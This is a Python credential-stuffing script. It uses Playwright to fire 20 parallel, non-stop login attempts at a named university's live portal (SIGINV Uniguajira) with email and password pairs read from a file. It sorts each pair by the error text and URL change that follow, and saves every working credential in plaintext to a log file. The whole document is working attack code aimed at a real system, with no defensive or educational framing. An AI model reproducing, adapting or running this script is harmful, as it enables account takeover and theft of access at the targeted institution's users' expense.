import os
import time
import csv
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger(__name__)

LOGIN_URL       = "https://siginv.uniguajira.edu.co/#/login"
ARCHIVO_CORREOS = "correos.txt"
WORKERS         = 20
ESPERA_CICLO    = 0


def leer_correos(archivo):
    cuentas = []
    try:
        with open(archivo, "r", encoding="utf-8") as f:
            for linea in f:
                linea = linea.strip()
                if not linea or linea.startswith("#"):
                    continue
                partes = linea.split(",", 1)
                if len(partes) == 2:
                    cuentas.append((partes[0].strip(), partes[1].strip()))
    except FileNotFoundError:
        log.error(f"No se encontró: {archivo}")
    return cuentas


def probar_login(email, password):
    resultado = {"email": email, "password": password, "exitoso": False, "mensaje": ""}
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(LOGIN_URL, wait_until="networkidle", timeout=20000)

            # Campo email
            page.fill("input[type='email'], input[placeholder*='orreo'], input[formcontrolname*='email'], input[formcontrolname*='correo'], input[formcontrolname*='usuario']", email)

            # Campo contraseña
            page.fill("input[type='password']", password)

            # Botón ingresar
            page.click("button[type='submit'], button:has-text('Ingresar'), button:has-text('Login')")

            page.wait_for_timeout(2000)

            url_actual = page.url
            contenido  = page.content().lower()
            browser.close()

            errores = ["contraseña incorrecta", "credenciales", "invalid",
                       "incorrecto", "no válido", "acceso denegado"]

            if any(e in contenido for e in errores):
                resultado["mensaje"] = "FALLIDO"
            elif "#/login" not in url_actual:
                resultado["exitoso"] = True
                resultado["mensaje"] = f"EXITOSO — {url_actual}"
            else:
                resultado["mensaje"] = "INCIERTO"

    except PlaywrightTimeout:
        resultado["mensaje"] = "TIMEOUT"
    except Exception as e:
        resultado["mensaje"] = f"ERROR — {str(e)[:80]}"

    return resultado


def guardar_resultados(resultados):
    os.makedirs("logs", exist_ok=True)
    archivo_log = "logs/resultados.csv"
    es_nuevo = not os.path.exists(archivo_log)
    with open(archivo_log, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if es_nuevo:
            writer.writerow(["timestamp", "email", "exitoso", "mensaje"])
        for r in resultados:
            writer.writerow([
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                r["email"],
                "SÍ" if r["exitoso"] else "NO",
                r["mensaje"]
            ])

    exitosos = [r for r in resultados if r["exitoso"]]
    if exitosos:
        with open("logs/exitosos.txt", "a", encoding="utf-8") as f:
            for r in exitosos:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {r['email']} | {r['password']}\n")
        log.info(f"💾 {len(exitosos)} exitosos en logs/exitosos.txt")


def ejecutar_ciclo():
    cuentas = leer_correos(ARCHIVO_CORREOS)
    if not cuentas:
        log.error("correos.txt vacío")
        return

    total    = len(cuentas)
    exitosos = fallidos = 0
    resultados_ciclo = []

    log.info(f"📋 {total} cuentas | 🔀 {WORKERS} workers")
    inicio = time.time()

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = {executor.submit(probar_login, e, p): e for e, p in cuentas}
        completados = 0
        for future in as_completed(futures):
            r = future.result()
            resultados_ciclo.append(r)
            completados += 1
            if r["exitoso"]:
                exitosos += 1
                log.info(f"  [{completados}/{total}] ✅ {r['email']} — {r['mensaje']}")
            else:
                fallidos += 1
                log.warning(f"  [{completados}/{total}] ❌ {r['email']} — {r['mensaje']}")

    guardar_resultados(resultados_ciclo)

    duracion = round(time.time() - inicio, 1)
    cpm      = round((total / duracion) * 60, 1) if duracion > 0 else 0

    log.info(f"{'='*50}")
    log.info(f"📊 ✅ {exitosos} | ❌ {fallidos} | ⚡ {cpm} CPM | ⏱ {duracion}s")
    log.info(f"{'='*50}")


if __name__ == "__main__":
    log.info("🤖 Bot PARALELO — SIGINV Uniguajira — 24/7")
    ciclo = 1
    while True:
        log.info(f"🔄 CICLO #{ciclo} — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        ejecutar_ciclo()
        if ESPERA_CICLO > 0:
            time.sleep(ESPERA_CICLO)
        ciclo += 1
